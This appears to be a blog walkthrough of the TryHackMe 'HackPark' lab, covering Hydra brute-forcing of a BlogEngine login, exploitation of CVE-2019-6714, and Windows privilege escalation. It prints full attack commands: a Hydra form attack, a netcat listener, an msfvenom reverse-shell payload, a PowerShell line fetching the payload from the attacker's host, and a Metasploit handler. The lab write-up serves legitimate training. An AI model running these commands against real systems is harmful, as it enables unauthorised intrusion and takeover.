---
layout: post
title: THM — HackPark
date: 2022-09-29 00:00:00 -500
categories: [TryHackMe]
tags: [Hydra]
---

<img src="/assets/images/HackPark/logo.png" alt="HackPark Logo" width="30%">

***
<center><strong><font color="White">Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!</font></strong></center>

***

## <strong><font color="#34A5DA">Reccon</font></strong>

After deploying the machine we can run basic nmap scan for open ports & services on the target machine.

```console
vladislav@Mac ~ % nmap -sV 10.10.205.86
Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-28 23:06 MSK
Nmap scan report for 10.10.205.86
Host is up (0.068s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.41 seconds
```

We can see that there is an HTTP service on port 80, then we open `10.10.205.86:80` in browser.

There we are interested in the login page. Inspecting the login form we can find out that it's using POST request type.

<img src="/assets/images/HackPark/1.png" alt="Inspecting the site" width="70%">

Moreover, the url of the login page is the following: `http://10.10.205.86/Account/login.aspx?ReturnURL=/admin/`.

***

## <strong><font color="#34A5DA">Using Hydra for brute-forcing the login</font></strong>

Now we know the URL, request type and probably the login name, so we can start brute-force with Hydra.

However, first we need to intercept the POST request using Burp Suite.

```http
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.205.86
Content-Length: 578
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.205.86
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.205.86/Account/login.aspx?ReturnURL=/admin/
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=user&ctl00%24MainContent%24LoginUser%24Password=pass&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8
```

Now we can use Hydra for cracking the password.

> [Good notes on hydra](https://github.com/gnebbia/hydra_notes)

We set username with `-l admin`, password list with `-P /share/wordlists/rockyou.txt`, target machine IP, HTTP form and "request string".

Request string contains of three elements separated by `:`:

* pageOnWhichTheLoginHappens
* list of parameters, here we have to specify with `^USER^` and `^PASS^` where usernames and passwords will be inserted
* a character which may be F (for failing strings) or S for successful strings followed by an equal sign `=` and a string which appears in a failed attempt or in a successful attempt

So in our case request string contains:

* `/Account/login.aspx?ReturnURL=/admin/` from the URL
* "`__VIEWSTATE`". There we should change two things: `UserNameuser` to `UserName=^USER^` and `Password=pass` to `Password=^PASS^`
* S=Success.

Here's the final hydra payload:

```bash
hydra -l admin -P share/wordlists/rockyou.txt 10.10.80.203 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed"
```

```console
vladislav@Mac ~ % hydra -l admin -P share/wordlists/rockyou.txt 10.10.80.203 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-29 00:06:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking http-post-form://10.10.80.203:80/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed
[STATUS] 995.00 tries/min, 995 tries in 00:01h, 14343406 to do in 240:16h, 16 active
[80][http-post-form] host: 10.10.80.203   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-29 00:08:15
```

So, the password is `1qaz2wsx`.

***

## <strong><font color="#34A5DA">Compromizing the machine</font></strong>

After logging into admin account we can find the blogengine version: `3.3.6.0`.

![BlogEngine About page](/assets/images/HackPark/2.png)

Searching on exploit-db, we can find the [vulnerability](https://www.exploit-db.com/exploits/46353). CVE-2019-6714. Download the script.

Firstly, we need to modify the script by changing the IP and Port of TCP connection.

Secondly, we need to rename the script:

```bash
mv 46353 PostView.ascx
```

Thirdly, we setup a reverse TCP listener. We can do this using netcat.

```console
vladislav@Mac ~ % netcat -nlvp 4445
```

After that we should upload the script using blogengine control panel:
1. Switch to *Dashboard*
2. Go to "*Published Posts*"
3. Go to "*Welcome to HackPark*"
4. In the text editor press the button "*File Manager*" and upload the PostView.ascx

Finally, go to `http://10.10.10.10/?theme=../../App_Data/files`. If everything done right, we recieve the connection.

```console
vladislav@Mac Downloads % netcat -nlvp 4445
Connection from 10.10.29.8:49232
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

***

## <strong><font color="#34A5DA">Windows Privilege Escalation</font></strong>

According to the next task we need to generate another reverse shell using msfvenom.

First, we need to generate the executable with msfvenom. Use another port!

```console
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.7.222 LPORT=4446 -f exe > rev_shell.exe

```

Next, start a simple HTTP server on your attack machine:
```bash
python3 -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
```

On the reverse shell download the script:
```
powershell -c Invoke-WebRequest -uri "http://10.18.7.222:8000/rev_shell.exe" -outfile "C:\\Windows\temp\rev_shell.exe"
```

Next, we need to setup a Metasploit TCP Reverse Shell:

```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.18.7.222
msf6 exploit(multi/handler) > set LPORT 4446
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.18.7.222:4446 
```

Run the uploaded script on the target machine:
```
cd \windows\temp
.\rev_shell.exe
```

If everything done right, we get the meterpreter reverse TCP session:
```bash
[*] Started reverse TCP handler on 10.18.7.222:4446 
[*] Sending stage (175686 bytes) to 10.10.29.8
[*] Meterpreter session 1 opened (10.18.7.222:4446 -> 10.10.29.8:49264) at 2022-09-29 16:32:08 +0300

meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

Next, let's use WinPEAS — a script that search for possible paths to escalate privileges on Windows hosts:
```bash
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat
```

On the meterpreter session:
```bash
meterpreter > upload winPEAS.bat c:\\windows\\temp
[*] uploading  : /Users/vladislav/winPEAS.bat -> c:\windows\temp
[*] uploaded   : /Users/vladislav/winPEAS.bat -> c:\windows\temp\winPEAS.bat
```

Run the script:
```bash
c:\Windows\Temp>.\winPEAS.bat
```

***

## <strong><font color="#34A5DA">Privilege Escalation Without Metasploit</font></strong>